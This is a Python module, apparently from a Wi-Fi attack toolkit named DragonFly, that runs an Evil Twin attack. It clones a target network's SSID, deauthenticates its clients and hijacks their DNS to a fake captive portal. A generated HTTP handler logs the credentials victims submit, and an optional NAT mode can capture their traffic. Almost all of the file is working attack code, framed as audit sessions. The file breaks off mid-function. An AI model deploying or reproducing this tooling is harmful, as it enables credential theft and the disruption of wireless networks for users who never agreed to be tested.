"""
dragonfly/services/evil_twin_service.py - Servicio de ataque Evil Twin y portal cautivo.

Orquesta hostapd, dnsmasq, iptables, el servidor HTTP de captura y el deauth
continuo. El orden importa: la interfaz AP se libera de NetworkManager, se
prepara y se verifica antes de arrancar hostapd; la IP se asigna después, sin
volver a bajar el enlace. El deauth solo se lanza cuando el AP está realmente
activo.
"""

from __future__ import annotations

import ipaddress
import json
import os
import shutil
import subprocess
import sys
import threading
import time

from dragonfly.config import BASE_DIR_EVIL, DIR_EVIL_PORTALS
from dragonfly.core.network_manager import release_device, restore_device
from dragonfly.core.process_manager import ProcessManager
from dragonfly.core.routing import (
    choose_gateway,
    find_upstream,
    get_dns_servers,
    get_interface_ipv4,
    get_primary_upstream_iface,
)
from dragonfly.core.session import SessionManager
from dragonfly.core.subprocess_utils import safe_popen, safe_run
from dragonfly.core.wifi_interfaces import (
    get_interface_info,
    get_interface_type,
    get_supported_bands,
    share_phy,
    supports_ap,
)
from dragonfly.services.wifi_service import WiFiService

GATEWAY = "10.0.0.1"
GATEWAY_CIDR = "10.0.0.1/24"
# El sistema puede tener su propio dnsmasq escuchando en 0.0.0.0:53. Para no
# detenerlo ni reiniciarlo, el DNS cautivo usa un puerto no estándar y las
# consultas de los clientes se redirigen con DNAT.
DNS_PORT = 5354
NAT_CHAIN = "DF_EVIL_NAT"
INPUT_CHAIN = "DF_EVIL_IN"
POST_CHAIN = "DF_EVIL_POST"
FORWARD_CHAIN = "DF_EVIL_FWD"
_INTERNET_PREFIX = "EvilTwin-NAT"
_TCPDUMP_CANDIDATES = (
    "/usr/sbin/tcpdump",
    "/usr/bin/tcpdump",
    "/sbin/tcpdump",
)

_CAPTURE_SCRIPT_TEMPLATE = '''#!/usr/bin/env python3
import http.server, urllib.parse, os
from datetime import datetime

LOG = __CRED_LOG__

class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        if parsed_path.query:
            try:
                params = urllib.parse.parse_qs(parsed_path.query)
                with open(LOG, "a") as f:
                    f.write(f"[{datetime.now()}] IP:{self.client_address[0]} DATA_GET:{params}\\n")
                    f.flush(); os.fsync(f.fileno())
            except Exception: pass

        if parsed_path.path == "/":
            self.path = "/index.html"

        local_path = self.translate_path(self.path)
        if not os.path.isfile(local_path):
            if self.path == "/index.html":
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<html><body><h2>Error: index.html no existe.</h2></body></html>")
                return
            self.send_response(302)
            self.send_header("Location", "http://10.0.0.1/index.html")
            self.end_headers()
            return
        return super().do_GET()

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length).decode("utf-8", "ignore")
            params = urllib.parse.parse_qs(data)
            with open(LOG, "a") as f:
                f.write(f"[{datetime.now()}] IP:{self.client_address[0]} CREDENCIALES:{params}\\n")
                f.flush(); os.fsync(f.fileno())
        except Exception: pass

        self.send_response(302)
        self.send_header("Location", "http://10.0.0.1/success.html")
        self.end_headers()

    def log_message(self, format, *args): pass

if __name__ == "__main__":
    os.chdir(__TMP_WEB__)
    class ThreadedServer(http.server.ThreadingHTTPServer):
        allow_reuse_address = True
    with ThreadedServer(("0.0.0.0", 80), CaptivePortalHandler) as httpd:
        httpd.serve_forever()
'''


class EvilTwinService:
    """
    Gestiona el despliegue del Rogue AP, portal cautivo HTTP y captura de credenciales.
    """

    def __init__(self, process_manager: ProcessManager = None, wifi_service: WiFiService = None):
        self.pm = process_manager or ProcessManager()
        self.wifi = wifi_service or WiFiService(process_manager=self.pm)
        self.is_running = False
        self._stop_event = threading.Event()
        self._worker_thread = None
        self.active_session_dir = None
        self.multi_deauth = None
        self._log_handles = []
        self._iptables_iface = None
        self._tmp_web = None
        self._mode = None
        self._upstream_iface = None
        self._gateway = GATEWAY
        self._ap_subnet = "10.0.0.0/24"
        self._sysctl_state = {}
        self._capture_started = False
        self._ap_prepared = False

    # ------------------------------------------------------------------
    # Portales y configuración
    # ------------------------------------------------------------------

    @staticmethod
    def list_portals():
        """
        Escanea la carpeta de portales y retorna aquellos que poseen un index.html válido.
        """
        if not os.path.exists(DIR_EVIL_PORTALS):
            return []
        portales = []
        try:
            for item in os.listdir(DIR_EVIL_PORTALS):
                p_dir = os.path.join(DIR_EVIL_PORTALS, item)
                if os.path.isdir(p_dir) and os.path.exists(os.path.join(p_dir, "index.html")):
                    portales.append(item)
            return sorted(portales)
        except Exception:
            return []

    @staticmethod
    def infer_hw_mode(channel) -> str:
        """``hw_mode=a`` para 5 GHz y ``g`` para 2.4 GHz."""
        try:
            channel_number = int(channel)
        except (TypeError, ValueError):
            channel_number = 1
        return "a" if channel_number > 14 else "g"

    @staticmethod
    def sanitize_ssid(ssid) -> str:
        """Evita saltos de línea que romperían el archivo de hostapd."""
        value = str(ssid or "").replace("\r", " ").replace("\n", " ").strip()
        return value or "FreeWiFi"

    @staticmethod
    def validate_ssid(ssid) -> str:
        """
        Valida un SSID para hostapd: 1-32 bytes UTF-8 y sin controles.

        Retorna el SSID limpio o lanza ``ValueError`` con un mensaje apto para
        mostrar en la pantalla táctil.
        """
        value = str(ssid or "").replace("\r", " ").replace("\n", " ").strip()
        if not value:
            raise ValueError("El SSID no puede estar vacío.")
        if any(ord(char) < 32 for char in value):
            raise ValueError("El SSID contiene caracteres de control.")
        if len(value.encode("utf-8")) > 32:
            raise ValueError("El SSID supera los 32 bytes permitidos por WiFi.")
        return value

    @classmethod
    def build_hostapd_config(cls, ap_iface: str, red_target: dict, channel=None,
                             internet_mode: bool = False,
                             country_code: str | None = None) -> str:
        """Construye una configuración hostapd abierta y válida para la banda."""
        try:
            channel_number = int(channel if channel is not None else red_target.get("ch") or 1)
        except (TypeError, ValueError):
            channel_number = 1
        ssid = cls.sanitize_ssid(red_target.get("essid"))
        lines = [
            f"interface={ap_iface}",
            "driver=nl80211",
            f"ssid={ssid}",
            f"hw_mode={cls.infer_hw_mode(channel_number)}",
            f"channel={channel_number}",
            "macaddr_acl=0",
            "auth_algs=1",
            "wpa=0",
            "ignore_broadcast_ssid=0",
        ]
        if any(ord(char) > 127 for char in ssid):
            lines.append("utf8_ssid=1")
        if internet_mode:
            # Los clientes no deben poder hablar entre ellos; solo salir por NAT.
            lines.append("ap_isolate=1")
            lines.append("ctrl_interface=/var/run/hostapd")
            lines.append("ctrl_interface_group=0")
            if channel_number > 14:
                lines.append(f"country_code={country_code or 'SV'}")
                lines.append("ieee80211d=1")
        return "\n".join(lines) + "\n"

    @staticmethod
    def build_dnsmasq_config(ap_iface: str, gateway: str = GATEWAY,
                             internet_mode: bool = False,
                             upstream_dns=None,
                             lease_file: str | None = None) -> str:
        """DHCP + DNS para el AP, con portal o con reenvío real a Internet.

        El DNS se publica en ``DNS_PORT`` en lugar de 53 porque el sistema puede
        tener dnsmasq/systemd-resolved ocupando el puerto estándar. Las reglas
        DNAT de ``_install_iptables`` redirigen las consultas de los clientes.
        """
        if not internet_mode:
            config = (
                f"interface={ap_iface}\n"
                "except-interface=lo\n"
                "bind-interfaces\n"
                f"listen-address={GATEWAY}\n"
                f"port={DNS_PORT}\n"
                "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
                f"dhcp-option=3,{GATEWAY}\n"
                f"dhcp-option=6,{GATEWAY}\n"
                f"address=/#/{GATEWAY}\n"
                "no-hosts\n"
                "no-resolv\n"
                "dhcp-authoritative\n"
                "log-dhcp\n"
            )
            if lease_file:
                config += f"dhcp-leasefile={lease_file}\n"
            return config

        try:
            interface = ipaddress.IPv4Interface(f"{gateway}/24")
        except ValueError as exc:
            raise RuntimeError(f"Gateway IPv4 inválido: {gateway}") from exc
        network = interface.network
        first_host = network.network_address + 10
        last_host = network.network_address + 250
        dns_servers = [server for server in (upstream_dns or []) if server]
        if not dns_servers:
            dns_servers = list(get_dns_servers())

        lines = [
            f"interface={ap_iface}",
            "except-interface=lo",
            "bind-interfaces",
            f"listen-address={gateway}",
            f"port={DNS_PORT}",
            f"dhcp-range={first_host},{last_host},255.255.255.0,12h",
            f"dhcp-option=3,{gateway}",
            f"dhcp-option=6,{gateway}",
            "no-hosts",
            "no-resolv",
            "domain-needed",
            "bogus-priv",
            "dhcp-authoritative",
            "log-dhcp",
            "cache-size=1000",
        ]
        for server in dns_servers[:3]:
            lines.append(f"server={server}")
        if lease_file:
            lines.append(f"dhcp-leasefile={lease_file}")
        return "\n".join(lines) + "\n"

    # ------------------------------------------------------------------
    # API pública
    # ------------------------------------------------------------------

    def start_evil_twin(self, ap_iface: str, mon_deauth: str, red_target: dict, portal_name: str,
                        deauth_mode: str = "broadcast", cliente_mac: str = None,
                        on_output=None, on_cred=None):
        """
        Inicia el ataque completo de Evil Twin con un punto de acceso falso y deauth en paralelo.
        """
        self._stop_event.clear()
        self.is_running = True

        def runner():
            log = on_output or (lambda _msg: None)
            session_dir = None
            tmp_web = None
            monitors = [mon_deauth] if mon_deauth else []
            try:
                session_dir, tmp_web, cred_log = self._prepare_session(portal_name, log)
                log(f"[*] Iniciando Evil Twin contra: {red_target.get('essid', 'Desconocido')}")
                log(f"[*] Sesión guardada en: {session_dir}")

                self._limpiar_procesos_previos()
                self._cleanup_iptables()

                self._prepare_ap(ap_iface, red_target, monitors, session_dir, log)
                self._start_dnsmasq(ap_iface, session_dir, log)
                self._install_iptables(ap_iface)
                self._start_web(tmp_web, session_dir, log)

                try:
                    self._start_single_deauth(mon_deauth, ap_iface, red_target, deauth_mode, cliente_mac, log)
                except Exception as exc:
                    log(f"[!] AP activo, pero el deauth no está disponible: {exc}")

                log("[+] Rogue AP y servidor cautivo activos.")
                log("[*] Escuchando credenciales entrantes...")
                self._credential_loop(cred_log, log, on_cred)

            except Exception as exc:
                log(f"[!] Evil Twin abortado: {exc}")
            finally:
                self._cleanup(session_dir, ap_iface, monitors, log)
                log("[+] Evil Twin detenido y red restaurada.")
                self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def start_evil_twin_dual(self, ap_iface: str, mon1: str, mon2: str,
                             red_ap: dict, target1: dict, target2: dict, portal_name: str,
                             on_output=None, on_cred=None):
        """
        Inicia Evil Twin con Rogue AP en ap_iface y desautenticación dual en mon1 y mon2.
        """
        self._stop_event.clear()
        self.is_running = True

        def runner():
            log = on_output or (lambda _msg: None)
            session_dir = None
            tmp_web = None
            monitors = [mon1, mon2]
            try:
                if not mon1 or not mon2 or mon1 == mon2:
                    raise RuntimeError("Se requieren dos interfaces de monitor distintas.")
                session_dir, tmp_web, cred_log = self._prepare_session(portal_name, log)
                log(f"[*] Iniciando Evil Twin Dual (AP: {red_ap.get('essid', 'Desconocido')})")
                log(f"[*] Sesión guardada en: {session_dir}")

                self._limpiar_procesos_previos()
                self._cleanup_iptables()

                self._prepare_ap(ap_iface, red_ap, monitors, session_dir, log)
                self._start_dnsmasq(ap_iface, session_dir, log)
                self._install_iptables(ap_iface)
                self._start_web(tmp_web, session_dir, log)

                try:
                    self.multi_deauth = self.wifi.start_dual_deauth(
                        mon1, mon2, target1, target2, burst="0", callback=log
                    )
                except Exception as exc:
                    log(f"[!] AP activo, pero el deauth dual no está disponible: {exc}")

                log("[+] Rogue AP y servidor cautivo activos con Deauth Dual.")
                log("[*] Escuchando credenciales entrantes...")
                self._credential_loop(cred_log, log, on_cred)

            except Exception as exc:
                log(f"[!] Evil Twin Dual abortado: {exc}")
            finally:
                self._cleanup(session_dir, ap_iface, monitors, log)
                log("[+] Evil Twin Dual detenido y red restaurada.")
                self.is_running = False

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def start_internet_ap(self, ap_iface: str, red_target: dict, upstream_iface=None,
                          deauth_mode: str = "none", mon_deauth: str = None,
                          mon_deauth2: str = None, deauth_targets=None,
                          capture: bool = False, on_output=None, on_client=None):
        """
        Inicia un Evil Twin abierto con salida real a Internet por NAT.

        ``ap_iface`` es la radio que emite el AP; ``upstream_iface`` es la salida
        a Internet (WiFi o Ethernet). El AP y el upstream nunca comparten radio:
        en este hardware ``brcmfmac`` anuncia AP+STA pero no emite un AP real en
        la vif secundaria. ``deauth_mode`` puede ser ``none``, ``single`` o
        ``dual``; los modos con deauth exigen radios monitor independientes.
        """
        log = on_output or (lambda _msg: None)
        if self.is_running:
            log("[!] Ya hay un Evil Twin activo. Deténgalo antes de iniciar otro.")
            return None

        self._stop_event.clear()
        self.is_running = True
        self._mode = "internet"

        def runner():
            session_dir = None
            monitors = []
            try:
                target = dict(red_target or {})
                target["essid"] = self.validate_ssid(target.get("essid"))
                try:
                    channel = int(target.get("ch") or 6)
                except (TypeError, ValueError):
                    channel = 6
                if channel < 1 or channel > 165:
                    raise RuntimeError(f"Canal WiFi inválido: {channel}")
                target["ch"] = channel

                # Nunca se usa como AP la interfaz que sostiene la ruta
                # principal: en la Raspberry Pi suele ser wlan0, que también
                # transporta SSH. Si se libera, se pierde el acceso remoto.
                primary_upstream = get_primary_upstream_iface()
                if primary_upstream and primary_upstream == ap_iface:
                    raise RuntimeError(
                        f"{ap_iface} es la salida principal a Internet. "
                        "Elija otra radio para el AP para no cortar SSH."
                    )

                upstream = self._resolve_upstream(ap_iface, upstream_iface)
                if not upstream:
                    raise RuntimeError(
                        "No se detectó una salida a Internet distinta de la interfaz AP."
                    )
                upstream_name = upstream["iface"]
                if upstream_name == ap_iface:
                    raise RuntimeError("El AP y el upstream no pueden ser la misma interfaz.")
                if share_phy(ap_iface, upstream_name):
                    raise RuntimeError(
                        f"{ap_iface} y {upstream_name} comparten radio. "
                        "Use otra radio para el AP o para Internet."
                    )
                if not upstream.get("dns"):
                    upstream["dns"] = get_dns_servers(upstream_name)

                bands = get_supported_bands(ap_iface)
                if channel > 14 and not bands.get("5"):
                    log(f"[!] {ap_iface} no soporta 5 GHz; se usará el canal 6.")
                    channel = 6
                    target["ch"] = channel
                elif 52 <= channel <= 144:
                    log("[!] El canal clonado es DFS; se usará el canal 36 "
                        "para evitar la espera de CAC.")
                    channel = 36
                    target["ch"] = channel

                if deauth_mode not in ("none", "single", "dual"):
                    raise RuntimeError(f"Modo de deauth desconocido: {deauth_mode}")

                if deauth_mode != "none":
                    if not mon_deauth:
                        raise RuntimeError("El modo con deauth requiere una interfaz monitor.")
                    if get_interface_type(mon_deauth) != "monitor":
                        mon_deauth = self.wifi.enable_monitor_mode(mon_deauth)
                    monitors.append(mon_deauth)

                    if deauth_mode == "dual":
                        if not mon_deauth2 or mon_deauth2 == mon_deauth:
                            raise RuntimeError("El deauth dual requiere dos monitores distintos.")
                        if get_interface_type(mon_deauth2) != "monitor":
                            mon_deauth2 = self.wifi.enable_monitor_mode(mon_deauth2)
                        monitors.append(mon_deauth2)

                for monitor in monitors:
                    if monitor == ap_iface or share_phy(monitor, ap_iface):
                        raise RuntimeError(
                            f"{monitor} comparte radio con el AP {ap_iface}."
                        )
                    if monitor == upstream_name or share_phy(monitor, upstream_name):
                        raise RuntimeError(
                            f"{monitor} comparte radio con el upstream {upstream_name}."
                        )

                gateway_info = choose_gateway(upstream_name)
                gateway = gateway_info["gateway"]
                self._upstream_iface = upstream_name
                self._gateway = gateway
                self._ap_subnet = gateway_info["network"]

                session_dir = self._prepare_internet_session(
                    ap_iface=ap_iface,
                    upstream=upstream,
                    red_target=target,
                    gateway_info=gateway_info,
                    deauth_mode=deauth_mode,
                    capture=capture,
                )
                log(f"[*] Evil Twin + Internet: SSID '{target['essid']}'")
                log(f"[*] AP {ap_iface} | Internet por {upstream_name} "
                    f"({upstream.get('ip', '?')}) | Gateway {gateway}")
                log(f"[*] Sesión guardada en: {session_dir}")

                self._limpiar_procesos_previos()
                self._cleanup_iptables()
                self._set_internet_sysctls(ap_iface, upstream_name, log)

                self._prepare_internet_ap(
                    ap_iface, target, monitors, session_dir, gateway, log
                )
                self._start_internet_dnsmasq(
                    ap_iface, session_dir, gateway, upstream, log
                )
                self._install_internet_iptables(
                    ap_iface, upstream_name, gateway, log
                )
                if capture:
                    self._start_capture(ap_iface, session_dir, log)

                if deauth_mode == "single":
                    try:
                        self._start_single_deauth(
                            mon_deauth, ap_iface, target, "broadcast", None, log
                        )
                    except Exception as exc:
                        log(f"[!] AP con Internet activo, pero el deauth falló: {exc}")
                elif deauth_mode == "dual":
                    targets = list(deauth_targets or [])
                    if len(targets) < 2:
                        raise RuntimeError("El deauth dual requiere dos redes objetivo.")
                    try:
                        self.multi_deauth = self.wifi.start_dual_deauth(
                            mon_deauth, mon_deauth2, targets[0], targets[1],
                            burst="0", callback=log,
                        )
                        log("[+] Deauth dual activo.")
                    except Exception as exc:
                        log(f"[!] AP con Internet activo, pero el deauth dual falló: {exc}")

                log("[+] AP con Internet activo. Los clientes navegan por NAT.")
                log("[*] HTTPS no se descifra; la captura pcap es solo tráfico cifrado.")
                self._internet_loop(
                    session_dir, ap_iface, upstream_name, log, on_client
                )

            except Exception as exc:
                log(f"[!] Evil Twin + Internet abortado: {exc}")
            finally:
                self._cleanup(session_dir, ap_iface, monitors, log)
                self._mode = None
                self._upstream_iface = None
                self._gateway = GATEWAY
                self._ap_subnet = "10.0.0.0/24"
                self.is_running = False
                log("[+] Evil Twin + Internet detenido y red restaurada.")

        self._worker_thread = threading.Thread(target=runner, daemon=True)
        self._worker_thread.start()
        return self._worker_thread

    def _resolve_upstream(self, ap_iface: str, requested=None):
        """Resuelve el upstream elegido o el mejor disponible."""
        requested_iface = None
        if isinstance(requested, dict):
            requested_iface = requested.get("iface")
        elif requested:
            requested_iface = str(requested)

        # La ruta por defecto actual manda: si el upstream elegido en la UI
        # cambió entre la detección y el arranque, es mejor usar la salida
        # vigente que dejar el NAT apuntando a una interfaz sin ruta.
        route = find_upstream(ap_iface=ap_iface)
        if route:
            return route

        if requested_iface and requested_iface != ap_iface:
            interface = get_interface_ipv4(requested_iface)
            if interface is not None:
                return {
                    "iface": requested_iface,
                    "ip": str(interface.ip),
                    "cidr": str(interface),
                    "network": str(interface.network),
                    "gateway": None,
                    "metric": 0,
                    "src": str(interface.ip),
                    "raw": "",
                    "dns": get_dns_servers(requested_iface),
                }
        return None

    def stop_evil_twin(self):
        """Envía la señal de parada al ataque Evil Twin."""
        self._stop_event.set()
        if self.multi_deauth:
            try:
                self.multi_deauth.stop()
            except Exception:
                pass
            self.multi_deauth = None
        try:
            self.wifi.stop_deauth_attack()
        except Exception:
            pass
        try:
            self.pm.terminate_proc("capture", timeout=2)
        except Exception:
            pass
        self.is_running = False

    def wait_until_stopped(self, timeout: float = 25.0) -> bool:
        """Espera a que el hilo de limpieza termine. True si ya no está activo."""
        worker = self._worker_thread
        if worker and worker.is_alive():
            worker.join(timeout)
            return not worker.is_alive()
        return True

    @classmethod
    def capture_available(cls) -> bool:
        """True si ``tcpdump`` está disponible para la captura opcional."""
        return bool(cls._find_tcpdump())

    def list_saved_sessions(self):
        """Retorna las sesiones de auditoría de Evil Twin guardadas."""
        return SessionManager.list_sessions(BASE_DIR_EVIL)

    def read_credentials(self, session_name: str) -> str:
        """Lee el archivo credentials.log de una sesión."""
        log_file = os.path.join(BASE_DIR_EVIL, session_name, "credentials.log")
        return SessionManager.read_file(log_file)

    # ------------------------------------------------------------------
    # Preparación de la sesión y del AP
    # ------------------------------------------------------------------

    def _prepare_session(self, portal_name: str, log):
        """Crea la sesión, copia el portal y genera el servidor de captura."""
        portal_source = os.path.join(DIR_EVIL_PORTALS, portal_name)
        if not os.path.isdir(portal_source) or not os.path.isfile(os.path.join(portal_source, "index.html")):
            raise RuntimeError(f"El portal '{portal_name}' no existe o no contiene index.html.")

        session_dir = SessionManager.create_session(BASE_DIR_EVIL)
        self.active_session_dir = session_dir
        timestamp = os.path.basename(session_dir).replace("Auditoria-", "")
        tmp_web = f"/tmp/evil_twin_web_{timestamp}"
        self._tmp_web = tmp_web
        os.makedirs(tmp_web, exist_ok=True)
        shutil.copytree(portal_source, tmp_web, dirs_exist_ok=True)

        cred_log = os.path.join(session_dir, "credentials.log")
        capture_script = (
            _CAPTURE_SCRIPT_TEMPLATE
            .replace("__CRED_LOG__", json.dumps(cred_log))
            .replace("__TMP_WEB__", json.dumps(tmp_web))
        )
        with open(os.path.join(tmp_web, "capture.py"), "w") as handle:
            handle.write(capture_script)

        success_path = os.path.join(tmp_web, "success.html")
        if not os.path.exists(success_path):
            with open(success_path, "w") as handle:
                handle.write(
                    '<html><body style="background:#0b1a2a;color:#fff;text-align:center;'
                    'font-family:sans-serif;margin-top:20vh;"><h2>Conexión Restablecida</h2>'
                    '<p>Ya puede cerrar esta ventana.</p></body></html>'
                )

        return session_dir, tmp_web, cred_log

    def _prepare_ap(self, ap_iface: str, red_target: dict, monitor_ifaces, session_dir: str, log):
        """Libera, prepara y verifica la interfaz AP antes de arrancar hostapd."""
        if not ap_iface:
            raise RuntimeError("No hay interfaz AP seleccionada.")
        if not supports_ap(ap_iface):
            raise RuntimeError(f"{ap_iface} no soporta modo AP.")
        for monitor in monitor_ifaces:
            if monitor and (monitor == ap_iface or share_phy(monitor, ap_iface)):
                raise RuntimeError(
                    f"{ap_iface} y {monitor} comparten la misma radio. "
                    "Use dos adaptadores independientes para AP + monitor."
                )

        self._ap_prepared = True
        if not release_device(ap_iface):
            log(f"[!] NetworkManager no confirmó la liberación de {ap_iface}; se intentará igualmente.")

        # Dejar la interfaz limpia y abajo: hostapd la subirá en modo AP.
        safe_run(["sudo", "ip", "link", "set", ap_iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)

        hostapd_conf = os.path.join(session_dir, "hostapd.conf")
        with open(hostapd_conf, "w") as handle:
            handle.write(self.build_hostapd_config(ap_iface, red_target))

        log_path = os.path.join(session_dir, "hostapd.log")
        proc = self._start_logged("hostapd", ["sudo", "hostapd", hostapd_conf], log_path)
        ok, detail = self._wait_for_hostapd(proc, ap_iface, red_target.get("essid"), log_path)
        if not ok:
            self.pm.terminate_proc("hostapd", timeout=2)
            last_line = self._last_line(detail)
            raise RuntimeError(f"hostapd no pudo activar el AP en {ap_iface}.{last_line}")

        # La IP se asigna con el AP ya activo y SIN bajar el enlace.
        safe_run(["sudo", "ip", "link", "set", ap_iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        result = safe_run(
            ["sudo", "ip", "addr", "replace", GATEWAY_CIDR, "dev", ap_iface],
            capture_output=True,
            text=True,
            timeout=4,
        )
        if result.returncode != 0:
            raise RuntimeError(f"No se pudo asignar {GATEWAY_CIDR} a {ap_iface}: {(result.stderr or '').strip()}")

        channel = red_target.get("ch", "?")
        mode = self.infer_hw_mode(channel)
        log(f"[+] AP '{self.sanitize_ssid(red_target.get('essid'))}' activo en {ap_iface} "
            f"(canal {channel}, hw_mode={mode}).")

    def _prepare_internet_session(self, ap_iface: str, upstream: dict,
                                  red_target: dict, gateway_info: dict,
                                  deauth_mode: str, capture: bool) -> str:
        """Crea la sesión y guarda la configuración del AP con Internet."""
        session_dir = SessionManager.create_session(
            BASE_DIR_EVIL, prefix=_INTERNET_PREFIX
        )
        self.active_session_dir = session_dir

        lease_file = os.path.join(session_dir, "dnsmasq.leases")
        try:
            with open(lease_file, "a", encoding="utf-8"):
                pass
            os.chmod(lease_file, 0o666)
        except OSError:
            pass

        metadata = {
            "modo": "evil_twin_internet",
            "iniciado": time.strftime("%Y-%m-%d %H:%M:%S"),
            "ap_iface": ap_iface,
            "upstream": upstream,
            "gateway": gateway_info,
            "red_objetivo": red_target,
            "deauth": deauth_mode,
            "captura": bool(capture),
            "nota": (
                "AP abierto con NAT. Los clientes navegan por la Raspberry Pi. "
                "El tráfico HTTPS no se descifra."
            ),
        }
        with open(os.path.join(session_dir, "session.json"), "w",
                  encoding="utf-8") as handle:
            json.dump(metadata, handle, indent=2, ensure_ascii=False)

        with open(os.path.join(session_dir, "README.txt"), "w",
                  encoding="utf-8") as handle:
            handle.write(
                "DragonFly - Evil Twin con Internet\n"
                "=================================\n\n"
                f"SSID: {red_target.get('essid')}\n"
                f"AP: {ap_iface}\n"
                f"Internet: {upstream.get('iface')} ({upstream.get('ip', '?')})\n"
                f"Gateway clientes: {gateway_info.get('gateway')}\n"
                f"Deauth: {deauth_mode}\n"
                f"Captura pcap: {'sí' if capture else 'no'}\n\n"
                "Los clientes reciben DHCP/DNS de este AP y su tráfico IPv4 sale\n"
                "por NAT usando la interfaz upstream. HTTPS viaja cifrado: el\n"
                "archivo traffic.pcap (si se activó) no permite leer su contenido.\n"
            )
        return session_dir

    def _prepare_internet_ap(self, ap_iface: str, red_target: dict,
                             monitor_ifaces, session_dir: str, gateway: str, log):
        """Prepara la radio AP y arranca hostapd en modo abierto."""
        if not ap_iface:
            raise RuntimeError("No hay interfaz AP seleccionada.")
        if not supports_ap(ap_iface):
            raise RuntimeError(f"{ap_iface} no soporta modo AP.")
        for monitor in monitor_ifaces:
            if monitor and (monitor == ap_iface or share_phy(monitor, ap_iface)):
                raise RuntimeError(
                    f"{ap_iface} y {monitor} comparten la misma radio. "
                    "Use dos adaptadores independientes para AP + monitor."
                )

        # A partir de aquí la interfaz puede quedar modificada; _cleanup debe
        # restaurarla incluso si hostapd falla.
        self._ap_prepared = True

        # Si el escaneo previo dejó esta radio en monitor, devolverla antes de
        # que NetworkManager y hostapd se peleen por el dispositivo.
        if get_interface_type(ap_iface) == "monitor":
            try:
                self.wifi.disable_monitor_mode(ap_iface)
            except Exception as exc:
                log(f"[!] No se pudo salir de monitor en {ap_iface}: {exc}")

        if not release_device(ap_iface):
            log(f"[!] NetworkManager no confirmó la liberación de {ap_iface}; se intentará igualmente.")

        safe_run(["sudo", "ip", "link", "set", ap_iface, "down"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "iw", "dev", ap_iface, "set", "type", "managed"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        safe_run(["sudo", "ip", "addr", "flush", "dev", ap_iface],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)

        hostapd_conf = os.path.join(session_dir, "hostapd.conf")
        with open(hostapd_conf, "w", encoding="utf-8") as handle:
            handle.write(self.build_hostapd_config(
                ap_iface, red_target, internet_mode=True
            ))

        log_path = os.path.join(session_dir, "hostapd.log")
        proc = self._start_logged("hostapd", ["sudo", "hostapd", hostapd_conf], log_path)
        ok, detail = self._wait_for_hostapd(
            proc, ap_iface, red_target.get("essid"), log_path
        )
        if not ok:
            self.pm.terminate_proc("hostapd", timeout=2)
            last_line = self._last_line(detail)
            raise RuntimeError(f"hostapd no pudo activar el AP en {ap_iface}.{last_line}")

        safe_run(["sudo", "ip", "link", "set", ap_iface, "up"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=3)
        cidr = f"{gateway}/24"
        result = safe_run(
            ["sudo", "ip", "addr", "replace", cidr, "dev", ap_iface],
            capture_output=True,
            text=True,
            timeout=4,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"No se pudo asignar {cidr} a {ap_iface}: "
                f"{(result.stderr or '').strip()}"
            )

        channel = red_target.get("ch", "?")
        log(f"[+] AP '{self.sanitize_ssid(red_target.get('essid'))}' activo en "
            f"{ap_iface} (canal {channel}, gateway {gateway}, abierto).")

    def _start_internet_dnsmasq(self, ap_iface: str, session_dir: str,
                                gateway: str, upstream: dict, log):
        """Arranca dnsmasq con DHCP y DNS real reenviado al upstream."""
        self.pm.terminate_proc("dnsmasq", timeout=2)
        ProcessManager.pkill("dnsmasq_evil.conf", full=True)
        ProcessManager.pkill(r"dnsmasq .*Auditoria-[^ ]*/dnsmasq\.conf", full=True)
        ProcessManager.pkill(
            r"dnsmasq .*EvilTwin-NAT-[^ ]*/dnsmasq\.conf", full=True
        )

        lease_file = os.path.join(session_dir, "dnsmasq.leases")
        conf_path = os.path.join(session_dir, "dnsmasq.conf")
        dns_servers = upstream.get("dns") or get_dns_servers(
            upstream.get("iface")
        )
        with open(conf_path, "w", encoding="utf-8") as handle:
            handle.write(self.build_dnsmasq_config(
                ap_iface,
                gateway=gateway,
                internet_mode=True,
                upstream_dns=dns_servers,
                lease_file=lease_file,
            ))

        log_path = os.path.join(session_dir, "dnsmasq.log")
        proc = self._start_logged(
            "dnsmasq", ["sudo", "dnsmasq", "-C", conf_path, "-d"], log_path
        )
        time.sleep(1.2)
        if proc.poll() is not None:
            detail = self._read_log(log_path)
            hint = ""
            if "address already in use" in detail.lower():
                hint = (
                    f" Otro servicio está usando el puerto DNS {DNS_PORT} "
                    "o el puerto DHCP 67."
                )
            raise RuntimeError(
                f"dnsmasq terminó al iniciar.{hint}{self._last_line(detail)}"
            )

        dns_text = ", ".join(dns_servers[:3]) or "DNS del sistema"
        log(f"[+] dnsmasq activo (DHCP {gateway}, DNS real -> {dns_text}).")

    def _wait_for_hostapd(self, proc, ap_iface: str, ssid, log_path: str, timeout: float = 12.0):
        """Espera a que hostapd anuncie AP-ENABLED o a que la interfaz sea tipo AP."""
        expected_ssid = self.sanitize_ssid(ssid)
        deadline = time.monotonic() + timeout
        last_log = ""
        while time.monotonic() < deadline:
            if proc.poll() is not None:
                return False, self._read_log(log_path)

            last_log = self._read_log(log_path)
            if "AP-ENABLED" in last_log:
                return True, last_log

            info = get_interface_info(ap_iface)
            if info.get("type") == "ap":
                current_ssid = info.get("ssid")
